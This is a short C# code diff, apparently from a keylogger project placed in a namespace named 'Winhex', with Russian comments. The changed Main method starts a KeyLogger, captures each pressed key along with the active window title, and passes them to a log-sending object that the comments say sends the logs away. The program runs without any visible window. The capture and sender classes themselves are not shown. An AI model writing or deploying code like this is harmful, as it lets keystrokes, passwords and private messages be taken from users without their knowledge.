@@ -22,14 +22,20 @@ namespace Winhex
         {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
+
+            // Начинаем получение нажатых клавиш 
             KeyLogger k = new KeyLogger();
             k.OnKeyPressed += K_OnKeyPressed;
+
+            // объект класса, отправляющего логи
             loger = new UserLogCreator();
+
             Application.Run();
         }
 
         private static void K_OnKeyPressed(string title, char sym)
         {
+            Console.WriteLine(sym);
             loger.AddKey(title, sym);
         }
     }
